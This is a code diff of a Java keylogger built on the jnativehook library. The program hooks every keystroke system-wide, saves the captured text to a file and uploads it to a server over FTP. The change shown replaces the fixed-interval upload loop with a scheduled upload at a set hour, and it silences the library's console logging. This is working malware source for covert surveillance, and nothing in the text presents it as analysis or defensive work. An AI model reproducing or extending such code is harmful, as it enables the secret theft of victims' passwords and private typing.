@@ -7,50 +7,55 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-public class KeyLogger extends Thread implements NativeKeyListener, Runnable {
+public class KeyLogger extends Thread implements NativeKeyListener, FileUploader {
 	
-	private final static int UPLOAD_TIME = 10;
 	private static String textEntered;
 	private FileHandler fileHandler;
 	private FTPHandler ftpHandler;
+	private Scheduler scheduler;
 	
 	public KeyLogger() {
 		textEntered = new String();
 		fileHandler = FileHandler.getInstance();
 		ftpHandler = new FTPHandler();
+		scheduler = new Scheduler(this);
 	}
 
     public static void main(String[] args) {
     	KeyLogger keyLogger = new KeyLogger();
 
         keyLogger.initializeKeyListener();
-        keyLogger.createFile();
-        
-        while(true) {
-        	wait(UPLOAD_TIME);
-        	System.out.println("Uploading...");
-            keyLogger.transferToFile();
-            keyLogger.uploadingFileToServer();
-        }
+        keyLogger.checkPeriodically();
     }
     
-    public void uploadingFileToServer() {
-    	ftpHandler.uploadToServer(fileHandler.getFile());
+    public void checkPeriodically() {
+    	scheduler.checkUploadHour();
+    }
+    
+	@Override
+	public void uploadFile() {
+		System.out.println("Uploading...");
+        createFile();
+        transferToFile();
+        uploadingFileToServer();
+	}
+    
+    public void createFile() {
+    	fileHandler.createNewFile();
     }
     
     public void transferToFile() {
     	fileHandler.writeToFile(textEntered);
     }
     
-    public void createFile() {
-    	fileHandler.createNewFile();
+    public void uploadingFileToServer() {
+    	ftpHandler.uploadToServer(fileHandler.getFile());
     }
-
+    
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
 		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
 		String convertedKey = convertKey(keyPressed);
-		
 		textEntered += convertedKey;
 	}
 	
@@ -84,7 +89,6 @@ public class KeyLogger extends Thread implements NativeKeyListener, Runnable {
         } 
         catch (NativeHookException ex) {
             System.err.println("There was a problem registering the native hook.");
-            System.err.println(ex.getMessage());
             System.exit(1);
         }
 
@@ -95,7 +99,7 @@ public class KeyLogger extends Thread implements NativeKeyListener, Runnable {
     public void disableConsoleLogger() {
     	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.OFF);
-        logger.setUseParentHandlers(false);
+        logger.setUseParentHandlers(false); 
     }
     
     public static void wait(int timeInSeconds) {
@@ -111,7 +115,6 @@ public class KeyLogger extends Thread implements NativeKeyListener, Runnable {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
-	
 }
 
 
